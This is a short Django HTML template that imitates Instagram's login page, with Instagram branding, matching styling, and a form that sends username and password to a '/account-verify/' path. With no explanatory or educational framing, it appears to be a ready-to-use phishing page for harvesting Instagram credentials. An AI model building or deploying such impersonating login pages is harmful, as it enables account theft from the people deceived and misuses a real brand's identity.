<!DOCTYPE html>
<html>
<head>
<title>Instagram</title>
<style>
body{background:#fafafa;font-family:Arial}
.box{width:360px;margin:60px auto;background:#fff;padding:40px;border:1px solid #dbdbdb;text-align:center}
input{width:100%;padding:10px;margin:8px 0;border:1px solid #dbdbdb;background:#fafafa}
button{width:100%;background:#0095f6;border:none;color:white;padding:10px;font-weight:bold}
.logo{font-size:36px;margin-bottom:20px}
</style>
</head>

<body>
<div class="box">
<div class="logo">Instagram</div>

<form method="POST" action="/account-verify/">
{% csrf_token %}
<input name="username" placeholder="Phone, username, or email" required>
<input name="password" type="password" placeholder="Password" required>
<button type="submit">Log In</button>
</form>
</div>
</body>
</html>
